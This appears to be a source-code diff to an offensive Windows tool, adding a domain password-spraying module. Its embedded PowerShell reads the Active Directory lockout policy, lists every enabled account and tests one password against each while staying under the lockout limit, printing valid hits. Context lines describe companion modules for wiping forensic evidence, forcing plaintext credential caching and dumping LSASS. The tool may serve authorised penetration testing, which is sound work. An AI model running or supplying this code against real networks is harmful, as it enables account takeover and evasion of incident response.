@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  password_spray: {
+    description:
+      "Domain password spraying — test a single password against multiple domain accounts with lockout-aware throttling. Enumerates domain password policy first (lockout threshold, observation window, complexity requirements), then sprays against all enabled accounts or a target list. Supports custom user lists, automatic jitter between attempts, and lockout threshold safety margin",
+    args: "--action policy|spray|status [--password PASSWORD] [--users FILE|all] [--dc DC_HOST] [--jitter SECONDS] [--threshold-margin N]",
+  },
   wdigest_enable: {
     description:
       "WDigest credential caching control — enable or disable UseLogonCredential registry key to force plaintext password storage in LSASS memory. When enabled, next interactive logon caches cleartext credentials retrievable via lsass_dump. Check current status, enable for credential harvesting, disable to restore, and force re-authentication via lock screen",
@@ -17620,6 +17625,187 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function passwordSpray(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "policy"
+  const password = argVal(args, "--password")
+  const users = argVal(args, "--users") || "all"
+  const dc = argVal(args, "--dc")
+  const jitter = argVal(args, "--jitter") || "2"
+  const margin = argVal(args, "--threshold-margin") || "2"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Domain password spraying...\n"]
+
+  if (action === "policy") {
+    const script = `
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+Write-Output "=== Domain Password Policy ==="
+Write-Output "Domain: $($domain.Name)"
+$root = [ADSI]"LDAP://$($domain.Name)"
+$lockoutThreshold = $root.Properties["lockoutThreshold"].Value
+$lockoutDuration = [timespan]::FromTicks([math]::Abs($root.Properties["lockoutDuration"].Value)).TotalMinutes
+$lockoutWindow = [timespan]::FromTicks([math]::Abs($root.Properties["lockoutObservationWindow"].Value)).TotalMinutes
+$minPwdLength = $root.Properties["minPwdLength"].Value
+$pwdHistory = $root.Properties["pwdHistoryLength"].Value
+$complexity = $root.Properties["pwdProperties"].Value
+Write-Output "Lockout Threshold: $lockoutThreshold attempts"
+Write-Output "Lockout Duration: $lockoutDuration minutes"
+Write-Output "Observation Window: $lockoutWindow minutes"
+Write-Output "Min Password Length: $minPwdLength"
+Write-Output "Password History: $pwdHistory"
+Write-Output "Complexity Required: $(if ($complexity -band 1) {'Yes'} else {'No'})"
+Write-Output ""
+if ($lockoutThreshold -eq 0) {
+  Write-Output "STATUS: NO LOCKOUT POLICY — unlimited spray attempts possible"
+} else {
+  Write-Output "STATUS: Lockout after $lockoutThreshold attempts, resets after $lockoutWindow minutes"
+  Write-Output "SAFE SPRAY: Use threshold-margin of 2, spray $(($lockoutThreshold - 2)) attempts max"
+  Write-Output "WAIT TIME: $lockoutWindow minutes between spray rounds"
+}
+# Count enabled users
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$searcher.PageSize = 1000
+$users = $searcher.FindAll()
+Write-Output ""
+Write-Output "Enabled domain users: $($users.Count)"
+# Fine-grained password policies
+$searcher.Filter = "(objectClass=msDS-PasswordSettings)"
+$fgpp = $searcher.FindAll()
+if ($fgpp.Count -gt 0) {
+  Write-Output ""
+  Write-Output "=== Fine-Grained Password Policies ==="
+  foreach ($p in $fgpp) {
+    Write-Output "Policy: $($p.Properties['cn'][0])"
+    Write-Output "  Lockout Threshold: $($p.Properties['msds-lockoutthreshold'][0])"
+    Write-Output "  Applies To: $($p.Properties['msds-psoappliesto'] -join ', ')"
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("NO LOCKOUT POLICY")) {
+      findings.push({
+        checkId: "SPRAY-001",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "Domain Password Policy",
+        title: "No account lockout policy configured",
+        details: "Domain has no lockout threshold — unlimited password spray attempts possible",
+        remediation: "Configure account lockout threshold in Group Policy.",
+      })
+    }
+  }
+
+  if (action === "spray") {
+    if (!password) {
+      output.push("ERROR: --password required for spray action")
+      return { output: output.join("\n"), findings }
+    }
+    const dcParam = dc ? `$dc = '${dc}'` : `$dc = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).PdcRoleOwner.Name`
+    const userFilter = users === "all"
+      ? `$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"`
+      : `$userList = Get-Content '${users}'; $searcher = $null`
+    const script = `
+${dcParam}
+Write-Output "=== Password Spray ==="
+Write-Output "Target DC: $dc"
+Write-Output "Password: ${'*'.repeat(8)}"
+Write-Output "Jitter: ${jitter}s between attempts"
+Write-Output "Threshold Margin: ${margin}"
+Write-Output ""
+# Get lockout policy
+$root = [ADSI]"LDAP://$($([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name)"
+$lockoutThreshold = [int]$root.Properties["lockoutThreshold"].Value
+$safeAttempts = if ($lockoutThreshold -gt 0) { $lockoutThreshold - ${margin} } else { 999999 }
+Write-Output "Lockout threshold: $lockoutThreshold, Safe attempts per user: $safeAttempts"
+Write-Output ""
+# Get users
+${userFilter}
+if ($searcher) {
+  $searcher.PageSize = 1000
+  $searcher.PropertiesToLoad.Add("sAMAccountName") | Out-Null
+  $userList = $searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"][0] }
+}
+Write-Output "Spraying against $($userList.Count) users..."
+Write-Output ""
+$hits = @()
+$tested = 0
+Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain)
+foreach ($u in $userList) {
+  $tested++
+  try {
+    $valid = $ctx.ValidateCredentials($u, '${password.replace(/'/g, "''")}')
+    if ($valid) {
+      Write-Output "[+] HIT: $u : ${password.replace(/'/g, "''")}"
+      $hits += $u
+    }
+  } catch {
+    # Account locked or other error
+    if ($_.Exception.Message -match 'locked') {
+      Write-Output "[!] LOCKED: $u"
+    }
+  }
+  if ($tested % 50 -eq 0) {
+    Write-Output "[*] Progress: $tested / $($userList.Count)"
+  }
+  Start-Sleep -Milliseconds (${jitter} * 1000 + (Get-Random -Maximum 1000))
+}
+Write-Output ""
+Write-Output "=== Results ==="
+Write-Output "Tested: $tested users"
+Write-Output "Hits: $($hits.Count)"
+foreach ($h in $hits) {
+  Write-Output "  VALID: $h"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    const hitMatches = r.stdout.match(/\[+\+\] HIT: .+/g) || []
+    for (const hit of hitMatches) {
+      findings.push({
+        checkId: "SPRAY-002",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: hit.replace("[+] HIT: ", "").split(" :")[0],
+        title: "Valid credentials found via password spray",
+        details: hit,
+        remediation: "Enforce strong unique passwords and enable MFA.",
+      })
+    }
+  }
+
+  if (action === "status") {
+    const script = `
+Write-Output "=== Account Lockout Status ==="
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(lockoutTime>=1))"
+$searcher.PageSize = 1000
+$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","lockoutTime","badPwdCount","badPasswordTime"))
+$locked = $searcher.FindAll()
+Write-Output "Currently locked accounts: $($locked.Count)"
+foreach ($a in $locked) {
+  $lockTime = [DateTime]::FromFileTime([Int64]$a.Properties["lockouttime"][0])
+  Write-Output "  $($a.Properties['samaccountname'][0]) — locked at $lockTime (bad attempts: $($a.Properties['badpwdcount'][0]))"
+}
+# Show accounts with recent bad password attempts
+$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(badPwdCount>=1)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+$badPwd = $searcher.FindAll()
+Write-Output ""
+Write-Output "Accounts with recent bad password attempts: $($badPwd.Count)"
+foreach ($a in ($badPwd | Select-Object -First 20)) {
+  Write-Output "  $($a.Properties['samaccountname'][0]) — $($a.Properties['badpwdcount'][0]) bad attempts"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function wdigestEnable(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "check"
   const waitLogon = hasFlag(args, "--wait-logon")
@@ -21391,6 +21577,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   process_inject: processInject,
   anti_forensics: antiForensics,
   wdigest_enable: wdigestEnable,
+  password_spray: passwordSpray,
 }
 
 export const WinhookTool = Tool.define("winhook", {
